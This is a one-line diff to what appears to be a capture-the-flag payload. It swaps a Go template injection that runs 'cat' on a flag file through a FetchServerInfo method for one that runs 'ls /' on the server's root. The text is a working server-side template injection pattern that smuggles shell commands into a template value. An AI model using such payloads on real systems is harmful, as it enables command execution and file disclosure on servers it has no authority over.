@@ -1,1 +1,1 @@
-{{ .FetchServerInfo "cat /flag2e8fc3fa13.txt" }}
+{{ .FetchServerInfo "ls /" }}
